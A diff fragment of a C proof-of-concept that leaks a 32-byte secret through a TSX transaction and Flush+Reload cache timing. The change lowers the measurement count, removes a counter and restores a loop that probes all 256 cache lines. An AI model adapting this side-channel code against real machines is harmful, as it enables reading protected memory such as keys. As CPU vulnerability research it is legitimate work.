@@ -26,14 +26,13 @@ wom_get_address(int fd) {
 	return addr;
 }
 
-#define NB_MEASUREMENTS 15000
+#define NB_MEASUREMENTS 3
 #define CACHELINE_SIZE 4096
 #define SIZE_SECRET 32 //bytes
 
 char *flush_reload;
 uint64_t results[256] = {0};
 uint64_t threshold    = 0;
-uint8_t k             = 0;
 uint32_t round        = 0;
 
 static inline uint64_t __attribute__((always_inline)) time_access(const volatile char *addr) {
@@ -134,11 +133,9 @@ int main(int argc, char *argv[]) {
 		for (size_t z = 0; z < 256; z++)
 			results[z] = 0;
 
-		k     = 0;
 		round = 0;
 
 		while (round < NB_MEASUREMENTS) {
-			k++;
 			round++;
 
 			uint8_t dummy;
@@ -160,15 +157,13 @@ int main(int argc, char *argv[]) {
 				             :
 				             : "r"(flush_reload), "r"(secret + i)
 				             : "memory", "%rax", "%rbx");
-
-				/* char secretchar                           = *(volatile char *)&secret;
-				flush_reload[secretchar * CACHELINE_SIZE] = secret; */
 				_xend();
 			}
 
-			//for (size_t j = 1; j < 256; j++) {
-			if ((time_access(&flush_reload[(k * CACHELINE_SIZE)])) < threshold) {
-				results[k]++;
+			for (size_t j = 1; j < 256; j++) {
+				if ((time_access(&flush_reload[(j * CACHELINE_SIZE)])) < threshold) {
+					results[j]++;
+				}
 			}
 		}
 
